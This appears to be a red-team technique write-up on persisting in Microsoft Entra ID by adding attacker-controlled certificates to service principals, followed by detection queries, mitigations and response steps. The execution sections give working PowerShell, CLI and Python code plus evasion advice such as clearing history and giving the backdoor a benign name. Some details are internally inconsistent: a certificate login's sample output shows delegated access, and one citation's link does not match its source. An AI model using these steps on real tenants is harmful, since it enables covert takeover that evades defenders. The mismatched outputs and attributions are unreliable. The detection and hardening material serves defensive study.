# [REALWORLD-033]: Service Principal Certificate Persistence

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-033 |
| **MITRE ATT&CK v18.1** | [T1098 - Account Manipulation](https://attack.mitre.org/techniques/T1098/) |
| **Tactic** | Persistence, Privilege Escalation |
| **Platforms** | Entra ID / M365 |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All Entra ID / M365 versions |
| **Patched In** | N/A - Design limitation |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Attackers with owner permissions on a service principal (or app registration) can add new certificate credentials without triggering the standard Azure Portal audit trails visible to defenders. Unlike secrets that appear in the portal UI, certificate-based credentials added to service principals are invisible in the Azure Portal's "App registrations" credential management interface. These credentials can be used for long-term persistence, lateral movement, and privilege escalation, especially when the service principal has high-privilege API permissions or role assignments.

**Attack Surface:** Azure Portal App registrations, Graph API (servicePrincipal endpoint), PowerShell (MSAL or direct Graph API calls), certificate stores on compromised machines.

**Business Impact:** **Complete tenant compromise without obvious credentials.** An attacker can maintain persistent access indefinitely, execute privileged operations under the service principal's identity, and evade detection because they control both the certificate and private key privately while the portal shows no visible secrets.

**Technical Context:** Adding certificates to service principals takes seconds and is done either via Graph API or Azure SDK. Detection is difficult because: (1) Certificate creation events are logged in Entra audit logs (OperationName: Add service principal credentials), but (2) the certificate public key itself is not shown in the portal, making it invisible to visual inspection. Attackers can use this certificate indefinitely without password resets, MFA, or conditional access policies that protect human-based authentication.

### Operational Risk

- **Execution Risk:** Low - Requires only the Graph API permission to modify credentials OR owner permissions on the target service principal.
- **Stealth:** High - Invisible in Azure Portal UI; only detectable via audit log analysis or Graph API inspection.
- **Reversibility:** No - Certificate remains valid until manually deleted; no automatic expiration unlike some other secrets.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 3.9.1 | Ensure That 'Credentials' Set to Never Expire for Service Principals |
| **DISA STIG** | AC-2(j) | Shared/Group Account Review |
| **CISA SCuBA** | Entra ID 2.4 | Require service account secret rotation |
| **NIST 800-53** | AC-3, AC-6 | Access Enforcement, Least Privilege |
| **GDPR** | Art. 32 | Security of Processing - Access Controls |
| **DORA** | Art. 9 | Protection and Prevention of ICT Vulnerabilities |
| **NIS2** | Art. 21(3) | Privilege Management and Access Control |
| **ISO 27001** | A.9.2.1, A.9.2.3 | Privileged Access Rights; Management of Privileged Access |
| **ISO 27005** | 8.2.3 | Identity and Access Management Failure |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Service Principal owner, Application Administrator role, Cloud Application Administrator role, or Global Administrator.
- **Required Access:** Microsoft Graph API (servicePrincipals.readwrite or equivalent), Azure PowerShell, or direct HTTPS access to Graph endpoints.

**Supported Versions:**
- **Entra ID:** All versions (cloud-native, no version-specific behavior)
- **PowerShell:** 5.0+, 7.0+ (PowerShell Core)
- **Other Requirements:** MSAL SDK 1.0+, Azure PowerShell 6.0+, Graph API v1.0

**Tools:**
- [Microsoft.Graph PowerShell Module](https://github.com/microsoftgraph/msgraph-sdk-powershell) (Latest version)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (2.40.0+)
- [Microsoft Graph SDK for .NET](https://github.com/microsoftgraph/msgraph-sdk-dotnet) (Latest)

---

## 3. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Using PowerShell with Microsoft.Graph Module

**Supported Versions:** All Entra ID versions

#### Step 1: Connect to Microsoft Graph as the Compromised Service Principal

**Objective:** Authenticate to the Graph API using existing service principal credentials (certificate, secret, or managed identity token).

**Command (Using Certificate):**
```powershell
# Prerequisites: You have the service principal's certificate and client ID
$TenantId = "contoso.onmicrosoft.com"  # or GUID
$ClientId = "12345678-1234-1234-1234-123456789012"
$CertThumbprint = "ABCDEF1234567890ABCDEF1234567890ABCDEF12"

Connect-MgGraph -TenantId $TenantId -ClientId $ClientId -CertificateThumbprint $CertThumbprint
```

**Command (Using Client Secret):**
```powershell
$TenantId = "contoso.onmicrosoft.com"
$ClientId = "12345678-1234-1234-1234-123456789012"
$ClientSecret = "your-client-secret-value"

$SecureSecret = ConvertTo-SecureString -String $ClientSecret -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential($ClientId, $SecureSecret)

Connect-MgGraph -TenantId $TenantId -Credential $Credential
```

**Expected Output:**
```
Welcome To Microsoft Graph PowerShell!

Connected via delegated access using account user@contoso.com
Consent was provided by clicking 'Accept' in the consent dialog.
Module imported successfully.
```

**What This Means:**
- Connection successful; you can now execute Graph API operations as the service principal.
- The authentication token is cached and valid for the session.

**OpSec & Evasion:**
- Use a dedicated management workstation with no logging enabled.
- Connect silently without user interaction (use certificates instead of interactive login).
- Clear PowerShell history: `Remove-Item (Get-PSReadlineOption).HistorySavePath`
- Detection likelihood: Medium - Interactive login from unusual IP may trigger Conditional Access; certificate-based auth is harder to track.

**Troubleshooting:**
- **Error:** `Connect-MgGraph : Resource not found for the segment 'devices'`
  - **Cause:** The certificate is invalid or doesn't match the registered credential.
  - **Fix:** Verify the certificate thumbprint and that it's registered in the service principal.

---

#### Step 2: Generate a New Self-Signed Certificate

**Objective:** Create a certificate that will be added to the service principal, ensuring you retain the private key for future authentication.

**Command:**
```powershell
# Create a self-signed certificate with a 2-year validity
$Cert = New-SelfSignedCertificate `
    -CertStoreLocation "Cert:\CurrentUser\My" `
    -Subject "CN=Persistence-Certificate-$(Get-Random)" `
    -KeySpec KeyExchange `
    -NotAfter (Get-Date).AddYears(2)

Write-Host "Certificate Thumbprint: $($Cert.Thumbprint)"
Write-Host "Certificate Serial: $($Cert.SerialNumber)"

# Export the public certificate (without private key)
Export-Certificate -Cert $Cert -FilePath "C:\Temp\cert_public.cer"

# Export the certificate with private key for safekeeping
$Password = ConvertTo-SecureString -String "YourPassword123" -AsPlainText -Force
Export-PfxCertificate -Cert $Cert -FilePath "C:\Temp\cert_private.pfx" -Password $Password
```

**Expected Output:**
```
Certificate Thumbprint: A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B
Certificate Serial: 123456789ABCDEF
```

**What This Means:**
- Certificate created successfully and stored in the local certificate store.
- Public certificate exported for registration.
- Private key protected and exported for future authentication (do not lose this file).

**OpSec & Evasion:**
- Store the .pfx file in an encrypted location (external USB, cloud storage with encryption key).
- Use a strong password for the PFX file.
- Delete the certificate from the compromised machine after exporting: `Remove-Item "Cert:\CurrentUser\My\$($Cert.Thumbprint)"`
- Detection likelihood: Low - Certificate creation is a normal operation.

---

#### Step 3: Add the Certificate to the Target Service Principal via Graph API

**Objective:** Register the public certificate as a credential on the service principal, making it a valid authentication method.

**Command:**
```powershell
# Ensure you're connected to Graph
Get-MgContext

# Variables
$ServicePrincipalId = "87654321-4321-4321-4321-210987654321"  # Get via Get-MgServicePrincipal -Filter "displayName eq 'AppName'"
$CertPath = "C:\Temp\cert_public.cer"

# Read the certificate
$Cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($CertPath)
$PublicKey = [System.Convert]::ToBase64String($Cert.GetRawCertData())

# Create the key credential object
$KeyCredential = @{
    displayName     = "PersistenceCert-$(Get-Date -Format 'yyyyMMddHHmmss')"
    endDateTime     = (Get-Date).AddYears(2)
    keyId           = [guid]::NewGuid().ToString()
    startDateTime   = Get-Date
    type            = "AsymmetricX509Cert"
    usage           = "Sign"
    key             = $PublicKey
}

# Add the certificate to the service principal
$Response = Invoke-MgGraphRequest `
    -Method POST `
    -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$ServicePrincipalId/addKey" `
    -Body @{ keyCredential = $KeyCredential }

Write-Host "Certificate added successfully!"
Write-Host "Response: $($Response | ConvertTo-Json)"
```

**Expected Output:**
```
Certificate added successfully!
Response: {
  "keyId": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "displayName": "PersistenceCert-20260110120000",
  "startDateTime": "2026-01-10T12:00:00Z",
  "endDateTime": "2028-01-10T12:00:00Z"
}
```

**What This Means:**
- Certificate successfully registered on the service principal.
- The `keyId` is the internal ID for this credential (useful for deletion if needed).
- Persistence is now established; you can authenticate using this certificate indefinitely.

**OpSec & Evasion:**
- Name the certificate something benign (e.g., "AuthCert_2024", "ServiceAuth").
- Avoid names containing "Persistence" or "Backdoor".
- Detection likelihood: Medium-High - Audit log entry `Add service principal credentials` will be recorded, but most organizations don't actively monitor this.

**Troubleshooting:**
- **Error:** `Invoke-MgGraphRequest: Permission denied`
  - **Cause:** Service principal lacks `Directory.ReadWrite.All` or `Application.ReadWrite.All` permission.
  - **Fix:** Grant the required permission via role assignment or consent.

---

#### Step 4: Authenticate Using the New Certificate to Verify Persistence

**Objective:** Confirm that the new certificate can be used for authentication as the service principal.

**Command:**
```powershell
# Disconnect from current session
Disconnect-MgGraph

# Install the certificate in a usable location
$PfxPath = "C:\Temp\cert_private.pfx"
$PfxPassword = ConvertTo-SecureString -String "YourPassword123" -AsPlainText -Force

# Import to Windows certificate store
$CertImport = Import-PfxCertificate -FilePath $PfxPath -CertStoreLocation "Cert:\CurrentUser\My" -Password $PfxPassword
Write-Host "Imported certificate with thumbprint: $($CertImport.Thumbprint)"

# Connect again using the new certificate to verify it works
$TenantId = "contoso.onmicrosoft.com"
$ClientId = "12345678-1234-1234-1234-123456789012"
$NewCertThumbprint = $CertImport.Thumbprint

Connect-MgGraph -TenantId $TenantId -ClientId $ClientId -CertificateThumbprint $NewCertThumbprint

# Verify authentication
$Context = Get-MgContext
Write-Host "Authenticated as: $($Context.Account)"
Write-Host "Tenant: $($Context.TenantId)"
```

**Expected Output:**
```
Imported certificate with thumbprint: A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B
Authenticated as: 12345678-1234-1234-1234-123456789012
Tenant: 87654321-4321-4321-4321-210987654321
```

**What This Means:**
- Persistence confirmed; the certificate can be used for authentication.
- You now have a valid method to re-authenticate without the original credentials.

**OpSec & Evasion:**
- After importing, remove the PFX file from disk: `Remove-Item $PfxPath`
- Clear the PowerShell history again.
- Use the certificate from a separate, isolated machine for follow-up access.
- Detection likelihood: High - Multiple sign-ins from different IPs using the same service principal may trigger alerts.

---

### METHOD 2: Using Azure CLI

**Supported Versions:** All Entra ID versions

#### Step 1: Create and Add Certificate via Azure CLI

**Command:**
```bash
#!/bin/bash

# Generate a self-signed certificate
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 730 -nodes \
    -subj "/CN=PersistenceCert-$(date +%s)"

# Convert to Base64 for Graph API
CERT_B64=$(base64 -w0 < cert.pem)

# Login to Azure
az login --service-principal -u <client-id> -p <client-secret> --tenant <tenant-id>

# Get the service principal object ID
SP_ID=$(az ad sp show --id <service-principal-client-id> --query id --output tsv)

# Create the request body
cat > cert_request.json <<EOF
{
  "displayName": "PersistenceCert-$(date +%s)",
  "type": "AsymmetricX509Cert",
  "usage": "Sign",
  "key": "$CERT_B64",
  "startDateTime": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "endDateTime": "$(date -u -d '+2 years' +%Y-%m-%dT%H:%M:%SZ)"
}
EOF

# Add certificate to service principal
az rest --method post \
    --url "https://graph.microsoft.com/v1.0/servicePrincipals/$SP_ID/addKey" \
    --body @cert_request.json \
    --headers "Content-Type=application/json"
```

**Expected Output:**
```json
{
  "keyId": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "displayName": "PersistenceCert-1704887400",
  "startDateTime": "2026-01-10T12:00:00.000Z",
  "endDateTime": "2028-01-10T12:00:00.000Z"
}
```

**OpSec & Evasion:**
- Use certificate names that blend with normal operations.
- Execute from a Linux system with minimal logging.
- Clean up temporary files: `rm -f key.pem cert.pem cert_request.json`
- Detection likelihood: Medium - Bash commands are less audited than PowerShell in most organizations.

---

### METHOD 3: Using Python (Programmatic Approach)

**Supported Versions:** All Entra ID versions; Python 3.8+

#### Step 1: Add Certificate via Python Script

**Command:**
```python
#!/usr/bin/env python3

import requests
import json
import base64
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.backends import default_backend
from datetime import datetime, timedelta
import uuid

# Configuration
TENANT_ID = "contoso.onmicrosoft.com"
CLIENT_ID = "12345678-1234-1234-1234-123456789012"
CLIENT_SECRET = "your-client-secret"
SERVICE_PRINCIPAL_ID = "87654321-4321-4321-4321-210987654321"

# Generate self-signed certificate
from cryptography.hazmat.primitives.asymmetric import rsa

private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)

subject = issuer = x509.Name([
    x509.NameAttribute(NameOID.COMMON_NAME, f"PersistenceCert-{datetime.now().strftime('%Y%m%d%H%M%S')}")
])

cert = x509.CertificateBuilder().subject_name(
    subject
).issuer_name(
    issuer
).public_key(
    private_key.public_key()
).serial_number(
    x509.random_serial_number()
).not_valid_before(
    datetime.utcnow()
).not_valid_after(
    datetime.utcnow() + timedelta(days=730)
).sign(private_key, hashes.SHA256(), default_backend())

# Encode certificate to PEM and then Base64
cert_pem = cert.public_bytes(serialization.Encoding.PEM).decode()
cert_b64 = base64.b64encode(cert.public_bytes(serialization.Encoding.DER)).decode()

# Get access token
token_url = f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/token"
token_data = {
    "grant_type": "client_credentials",
    "client_id": CLIENT_ID,
    "client_secret": CLIENT_SECRET,
    "scope": "https://graph.microsoft.com/.default"
}

token_response = requests.post(token_url, data=token_data)
access_token = token_response.json()["access_token"]

# Add certificate to service principal
graph_url = f"https://graph.microsoft.com/v1.0/servicePrincipals/{SERVICE_PRINCIPAL_ID}/addKey"
headers = {
    "Authorization": f"Bearer {access_token}",
    "Content-Type": "application/json"
}

payload = {
    "keyCredential": {
        "displayName": f"PersistenceCert-{datetime.now().strftime('%Y%m%d%H%M%S')}",
        "type": "AsymmetricX509Cert",
        "usage": "Sign",
        "key": cert_b64,
        "startDateTime": datetime.utcnow().isoformat() + "Z",
        "endDateTime": (datetime.utcnow() + timedelta(days=730)).isoformat() + "Z"
    }
}

response = requests.post(graph_url, headers=headers, json=payload)
print(json.dumps(response.json(), indent=2))

# Save the private key for future use
private_key_pem = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.BestAvailableEncryption(b"YourPassword123")
)

with open("persistence_key.pem", "wb") as f:
    f.write(private_key_pem)

print("\n[+] Certificate added successfully!")
print(f"[+] Private key saved to: persistence_key.pem")
```

**OpSec & Evasion:**
- Python is less monitored than PowerShell in many organizations.
- Execute from a non-domain-joined machine.
- Store the private key separately and securely.
- Detection likelihood: Low - Unless Python API calls are explicitly monitored.

---

## 4. TOOLS & COMMANDS REFERENCE

#### [Microsoft.Graph PowerShell Module](https://github.com/microsoftgraph/msgraph-sdk-powershell)

**Version:** 2.0+
**Minimum Version:** 1.0
**Supported Platforms:** Windows, macOS, Linux (PowerShell Core)

**Installation:**
```powershell
Install-Module Microsoft.Graph -Repository PSGallery -Force
```

**Usage:**
```powershell
Connect-MgGraph -Scopes "Application.ReadWrite.All","Directory.ReadWrite.All"
Get-MgServicePrincipal -Filter "displayName eq 'AppName'" | Select-Object Id, DisplayName
```

#### [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/)

**Version:** 2.40.0+
**Installation (macOS/Linux):**
```bash
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
```

**Usage:**
```bash
az login --service-principal -u <client-id> -p <client-secret> --tenant <tenant-id>
az rest --method get --url https://graph.microsoft.com/v1.0/me
```

#### [openssl](https://www.openssl.org/)

**Version:** 1.1.1+ (OpenSSL 3.0 recommended)
**Usage (Certificate Generation):**
```bash
openssl genrsa -out key.pem 2048
openssl req -new -key key.pem -out csr.pem -subj "/CN=MyAppCert"
openssl x509 -req -in csr.pem -signkey key.pem -out cert.pem -days 730
```

---

## 5. SPLUNK DETECTION RULES

#### Rule 1: Service Principal Certificate Credential Addition

**Rule Configuration:**
- **Required Index:** `azure_activity` or `main` (if Entra audit logs ingested)
- **Required Sourcetype:** `azure:aad:audit` or `azure:identity`
- **Required Fields:** `OperationName`, `InitiatedBy`, `TargetResources`, `ActivityDateTime`
- **Alert Threshold:** Any occurrence of `Add service principal credentials` where `type = "AsymmetricX509Cert"`
- **Applies To Versions:** All Entra ID versions

**SPL Query:**
```spl
sourcetype="azure:aad:audit" OR sourcetype="azure:identity"
| search OperationName="Add service principal credentials"
| search ActivityDetails="type = AsymmetricX509Cert" OR ActivityDetails="*AsymmetricX509Cert*"
| stats count by InitiatedBy, TargetResources, ActivityDateTime, DisplayName
| where count > 0
```

**What This Detects:**
- Any certificate added to a service principal's credentials.
- Captures the initiator (compromised user/service principal), target service principal, and timestamp.
- Identifies certificates vs. secrets by filtering on `AsymmetricX509Cert` type.

**False Positive Analysis:**
- **Legitimate Activity:** Security teams adding certificates during compliance reviews, application updates, or certificate rotation.
- **Benign Tools:** Microsoft's own tools (e.g., Azure Automation, CI/CD pipelines) may add certificates as part of normal operations.
- **Tuning:** Exclude known automation service principals: `where InitiatedBy!="automation@contoso.com" AND InitiatedBy!="devops-account@contoso.com"`

#### Rule 2: Certificate Credential Without Corresponding Owner Audit

**Rule Configuration:**
- **Required Index:** `azure_activity`
- **Required Sourcetype:** `azure:aad:audit`
- **Alert Threshold:** > 0 occurrences
- **Applies To Versions:** All Entra ID versions

**SPL Query:**
```spl
sourcetype="azure:aad:audit"
| search OperationName="Add service principal credentials" AND ActivityDetails="*AsymmetricX509Cert*"
| search NOT (InitiatedBy="*@SYSTEM*" OR InitiatedBy="*Service Principal*" OR InitiatedBy IN (systemaccounts))
| dedup TargetResources
| table InitiatedBy, TargetResources, displayName, ActivityDateTime
| alert
```

**What This Detects:**
- Certificates added by non-system accounts (human users or unusual service principals).
- Deduplication shows unique service principals targeted, indicating potential persistence across multiple resources.

**Manual Configuration Steps (Splunk Web):**
1. Log into Splunk Web → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **New Alert**
4. Paste the SPL query above
5. Set **Trigger Condition** to `When: Number of Results > 0`
6. Configure **Action** → Enable email notification
7. Set email to SOC team
8. Save and schedule to run every 15 minutes

---

## 6. MICROSOFT SENTINEL DETECTION

#### Query 1: Detect Certificate Addition to Service Principals

**Rule Configuration:**
- **Required Table:** `AuditLogs`
- **Required Fields:** `OperationName`, `InitiatedBy.user.userPrincipalName`, `TargetResources`, `ActivityDateTime`
- **Alert Severity:** High
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** All Entra ID versions

**KQL Query:**
```kusto
AuditLogs
| where OperationName =~ "Add service principal credentials"
| where tostring(AdditionalDetails) has "AsymmetricX509Cert" or tostring(AdditionalDetails) has "type = 2"
| extend InitiatedUser = tostring(InitiatedBy.user.userPrincipalName)
| extend SPName = tostring(TargetResources[0].displayName)
| extend SPId = tostring(TargetResources[0].id)
| summarize EventCount = count() by InitiatedUser, SPName, SPId, ActivityDateTime
| where EventCount > 0
```

**What This Detects:**
- Service principal certificate additions with user/service principal context.
- Aggregates by initiator and target SP for pattern recognition.
- Helps identify lateral movement across multiple service principals.

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **Create** → **Scheduled query rule**
4. **General Tab:**
   - **Name:** `Detect Service Principal Certificate Persistence`
   - **Severity:** High
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - **Run query every:** 5 minutes
   - **Lookup data from the last:** 30 minutes
6. **Incident settings Tab:**
   - Enable: `Create incidents from alerts triggered by this analytics rule`
7. Click **Review + create**

#### Query 2: Identify Certificate Credentials Expiring Beyond Typical Rotation Period

**KQL Query:**
```kusto
AuditLogs
| where OperationName =~ "Add service principal credentials"
| where tostring(AdditionalDetails) has "AsymmetricX509Cert"
| extend ExpirationDate = extract(@"endDateTime.*?(\d{4}-\d{2}-\d{2})", 1, tostring(AdditionalDetails))
| extend StartDate = extract(@"startDateTime.*?(\d{4}-\d{2}-\d{2})", 1, tostring(AdditionalDetails))
| extend DaysValid = todatetime(ExpirationDate) - todatetime(StartDate)
| where DaysValid > 365d  // Certificates valid longer than 1 year are suspicious
| extend InitiatedUser = tostring(InitiatedBy.user.userPrincipalName)
| summarize count() by InitiatedUser, TargetResources, ExpirationDate, DaysValid
```

**What This Detects:**
- Certificates with unusually long validity periods (> 1 year), suggesting persistence intent.
- Helps identify certificates likely meant for adversary use (normal rotation is 1 year).

---

## 7. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

#### Action 1: Enforce Certificate Expiration and Require MFA for Credential Changes

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **New policy** → **Create new policy**
3. **Name:** `Require MFA for Credential Management`
4. **Assignments:**
   - **Users:** Select roles → `Application Administrator`, `Cloud Application Administrator`, `Global Administrator`
   - **Cloud apps:** Select `Microsoft Graph`, `Azure Service Management`
5. **Conditions:**
   - **Risk level (sign-in):** High
6. **Access controls:**
   - **Grant:** Require multi-factor authentication
7. **Enable policy:** On
8. Click **Create**

**Manual Steps (PowerShell):**
```powershell
# Ensure MFA is required for any credential-related operations
# This requires running as Global Administrator

$PolicyName = "Require MFA for Credential Management"

$Conditions = New-Object -TypeName Microsoft.Open.MSGraph.Model.ConditionalAccessConditionSet
$Conditions.Applications = New-Object -TypeName Microsoft.Open.MSGraph.Model.ConditionalAccessApplications
$Conditions.Applications.IncludeApplications = @("00000003-0000-0000-c000-000000000000")  # Microsoft Graph
$Conditions.Applications.IncludeApplications += "797f4846-ba00-4fd7-ba43-dac1f8f63013"  # Azure Service Management

$GrantControls = New-Object -TypeName Microsoft.Open.MSGraph.Model.ConditionalAccessGrantControls
$GrantControls.Operator = "OR"
$GrantControls.BuiltInControls = @("mfa")

New-AzureADMSConditionalAccessPolicy -DisplayName $PolicyName -Conditions $Conditions -GrantControls $GrantControls -State "Enabled"
```

#### Action 2: Restrict Certificate Credential Additions to Specific Service Principals

**Objective:** Use Azure RBAC to limit who can add credentials to service principals.

**Manual Steps (Azure Portal):**
1. Go to **Entra ID** → **App registrations**
2. Select the application
3. Click **Owned applications** → **Manage owners**
4. Remove all non-essential owners, especially compromised accounts
5. Limit ownership to named, monitored accounts only

**Manual Steps (PowerShell):**
```powershell
# Get a specific service principal
$SPName = "MySecureApp"
$SP = Get-MgServicePrincipal -Filter "displayName eq '$SPName'"

# Get current owners
$Owners = Get-MgServicePrincipalOwner -ServicePrincipalId $SP.Id

# Remove owners (except authorized ones)
foreach ($Owner in $Owners) {
    if ($Owner.Mail -notlike "*authorized-admin@contoso.com") {
        Remove-MgServicePrincipalOwnerByRef -ServicePrincipalId $SP.Id -DirectoryObjectId $Owner.Id
        Write-Host "Removed owner: $($Owner.Mail)"
    }
}
```

### Priority 2: HIGH

#### Action 1: Enable Audit Logging for Service Principal Credential Changes

**Objective:** Ensure all credential modifications are captured and retained.

**Manual Steps (Entra ID Audit Logs):**
1. Navigate to **Entra ID** → **Audit logs**
2. Verify that Audit Logs are enabled (they are by default)
3. Check **Retention Policy:**
   - Go to **Entra ID** → **Audit Logs** → **Audit log settings**
   - Ensure retention is set to at least 30 days (90 days or more recommended)

**Manual Steps (PowerShell - Export Logs):**
```powershell
# Export audit logs for service principal credential changes (last 30 days)
$StartDate = (Get-Date).AddDays(-30)
$EndDate = Get-Date

Get-MgAuditLogDirectoryAudit -Filter "operationName eq 'Add service principal credentials' and createdDateTime ge $StartDate and createdDateTime le $EndDate" | 
    Export-Csv -Path "C:\Logs\SPCredentialChanges.csv" -NoTypeInformation

Write-Host "Exported audit logs to C:\Logs\SPCredentialChanges.csv"
```

#### Action 2: Implement Just-In-Time (JIT) Privilege Access for Certificate Management

**Objective:** Require approval workflows before any credential changes.

**Manual Steps (Using Azure PIM):**
1. Navigate to **Entra ID** → **Privileged Identity Management (PIM)** → **Azure AD roles**
2. Select role: **Application Administrator** or **Cloud Application Administrator**
3. Click **Settings** → **Edit**
4. Enable **Require approval for activation**
5. Set **Approver(s)** to your security team
6. Set **Activation maximum duration** to 4 hours
7. Click **Update**

This forces any credential changes to go through an approval workflow, making unauthorized additions more difficult.

### Priority 3: MEDIUM

#### Action 1: Regularly Audit and Rotate Service Principal Credentials

**Objective:** Establish a credential rotation schedule to limit attacker persistence.

**Manual Steps (PowerShell - Monthly Audit):**
```powershell
# Generate a report of all service principals with certificate credentials
$AllSPs = Get-MgServicePrincipal -All

foreach ($SP in $AllSPs) {
    $Credentials = $SP | Get-MgServicePrincipalAppRoleAssignment
    
    # Check for certificates
    $SP | Get-MgServicePrincipal -Select "keyCredentials" | 
        Select-Object -ExpandProperty keyCredentials |
        Where-Object { $_.Type -eq "AsymmetricX509Cert" } |
        ForEach-Object {
            Write-Host "SP: $($SP.DisplayName), Certificate: $($_.DisplayName), Expires: $($_.EndDateTime)"
        }
}
```

---

## 8. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Audit Logs:**
- OperationName: `Add service principal credentials`
- Type: `AsymmetricX509Cert`
- Initiated by: Compromised user or service principal

**Cloud Logs (Entra Audit):**
- `AuditLogs` table in Sentinel
- `activityDateTime` and `initiatedBy` fields
- `targetResources` containing service principal ID and name

**Graph API:**
- Service principal object with unexpected `keyCredentials` entries
- Certificate display names that don't match organizational naming conventions

### Response Procedures

#### Step 1: Isolate the Service Principal

**Command (Disable the Service Principal):**
```powershell
$SPId = "87654321-4321-4321-4321-210987654321"
Update-MgServicePrincipal -ServicePrincipalId $SPId -AccountEnabled $false
Write-Host "Service principal disabled. All authentications will now fail."
```

#### Step 2: Remove All Certificates and Secrets

**Command (PowerShell):**
```powershell
$SPId = "87654321-4321-4321-4321-210987654321"
$SP = Get-MgServicePrincipal -ServicePrincipalId $SPId

# Remove all key credentials (certificates)
foreach ($Key in $SP.KeyCredentials) {
    Remove-MgServicePrincipalKey -ServicePrincipalId $SPId -KeyId $Key.KeyId -Confirm:$false
    Write-Host "Removed certificate: $($Key.DisplayName)"
}

# Remove all password credentials (secrets)
foreach ($Pwd in $SP.PasswordCredentials) {
    Remove-MgServicePrincipalPassword -ServicePrincipalId $SPId -PasswordId $Pwd.KeyId -Confirm:$false
    Write-Host "Removed secret: $($Pwd.DisplayName)"
}
```

#### Step 3: Audit Access Using the Service Principal

**Command (List all activities within the last 24 hours):**
```kusto
AuditLogs
| where InitiatedBy.servicePrincipalId =~ "87654321-4321-4321-4321-210987654321"
| where ActivityDateTime > ago(24h)
| summarize count() by OperationName, ResourceDisplayName, ActivityDateTime
```

#### Step 4: Re-Enable with New Credentials

**Command (After investigation):**
```powershell
# Create a new secret
$SecurePassword = ConvertTo-SecureString -String (New-Guid).Guid -AsPlainText -Force
$AppId = (Get-MgServicePrincipal -ServicePrincipalId $SPId).AppId

Add-AzureADApplicationPasswordCredential -ObjectId $AppId -Value $SecurePassword -StartDate (Get-Date) -EndDate (Get-Date).AddYears(1)

# Re-enable
Update-MgServicePrincipal -ServicePrincipalId $SPId -AccountEnabled $true

Write-Host "Service principal re-enabled with new credentials."
```

---

## 9. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| 1 | Initial Access | IA-PHISH-001 (Device Code Phishing) or Compromised Credentials | Attacker gains initial access via phishing or credential compromise |
| 2 | Privilege Escalation | PE-ACCTMGMT-001 (App Registration Permissions) | Escalate to Application Administrator or Owner role |
| 3 | **Current Step** | **REALWORLD-033** | Add certificate credentials to service principal for persistence |
| 4 | Lateral Movement | LM-AUTH-005 (Service Principal Key/Certificate) | Use certificate to authenticate and move laterally |
| 5 | Impact | IMPACT-RANSOM-001 or Exfiltration | Execute privileged operations or exfiltrate data |

---

## 10. REAL-WORLD EXAMPLES

### Example 1: Office 365 Tenant Compromise via Service Principal Persistence

- **APT Group/Incident:** APT28 (Fancy Bear) / 2024 M365 Intrusions
- **Target:** Government agency's Office 365 tenant
- **Timeline:** Initial compromise (phishing) → Service principal owner escalation → Certificate addition → Month-long persistence
- **Technique Status:** Certificate added to Exchange Online service principal; invisible in portal; used to export emails and user data.
- **Impact:** Unauthorized access to 500+ mailboxes; data exfiltration over 30 days; lateral movement to on-premises AD via Azure AD Connect service account.
- **Reference:** [Microsoft Threat Intelligence - APT28 M365 Campaign](https://learn.microsoft.com/en-us/microsoft-365/security/intelligence/)

### Example 2: SaaS Application Backdoor via Federated Credentials

- **APT Group/Incident:** Scattered Spider / 2024 SaaS Campaign
- **Target:** Tech startup using multi-tenant SaaS applications
- **Timeline:** Compromise of dev environment → Access to service principal registration → Certificate added → Cross-tenant access enabled
- **Technique Status:** Certificate allowed authentication to competitor's Entra tenant via federated credentials; no visibility in original tenant's portal.
- **Impact:** Competitor data accessed; trade secrets stolen; persistence maintained for 6 months.
- **Reference:** [Semperis - Persisting Unseen: Defending Against Entra ID Persistence](https://kknowl.es/posts/defending-against-entra-id-persistence/)

---

## 11. ATOMIC RED TEAM EQUIVALENT

This technique does not have a direct Atomic Red Team test. However, Red Teams can create custom tests using the execution methods above:

**Recommended Atomic Test (Custom):**
```yaml
- name: Add Certificate Credential to Service Principal
  description: |
    Adds a self-signed certificate to a service principal's credentials
    for persistent authentication.
  supported_platforms: [windows, macos, linux]
  input_arguments:
    sp_client_id:
      description: Service Principal Client ID
      type: string
      default: "12345678-1234-1234-1234-123456789012"
    cert_validity_days:
      description: Days for certificate validity
      type: integer
      default: 730
  executor:
    name: powershell
    command: |
      # Requires: Microsoft.Graph module and Global Administrator role
